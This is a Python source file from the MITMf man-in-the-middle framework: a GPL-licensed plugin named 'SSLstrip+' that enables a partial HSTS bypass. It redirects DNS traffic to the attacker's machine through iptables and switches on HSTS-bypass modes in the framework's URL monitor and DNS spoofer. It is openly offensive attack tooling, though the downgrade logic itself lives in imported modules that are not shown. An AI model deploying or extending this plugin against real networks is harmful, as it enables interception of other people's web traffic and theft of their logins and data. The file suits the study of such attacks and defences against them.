#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import sys
import logging

from plugins.plugin import Plugin
from core.utils import IpTables, SystemConfig
from core.sslstrip.URLMonitor import URLMonitor
from core.dnschef.DNSchef import DNSChef

class HSTSbypass(Plugin):
    name      = 'SSLstrip+'
    optname   = 'hsts'
    desc      = 'Enables SSLstrip+ for partial HSTS bypass'
    version   = "0.4"
    tree_info = ["SSLstrip+ by Leonardo Nve running"]
    has_opts  = False

    def initialize(self, options):
        self.options = options
        self.manualiptables = options.manualiptables
        ip_address = SystemConfig.getIP(options.interface)

        if not options.manualiptables:
            if IpTables.getInstance().dns is False:
                IpTables.getInstance().DNS(ip_address, self.config['MITMf']['DNS']['port'])

        URLMonitor.getInstance().setHstsBypass()
        DNSChef.getInstance().setHstsBypass()

    def finish(self):
        if not self.manualiptables:
            if IpTables.getInstance().dns is True:
                IpTables.getInstance().Flush()
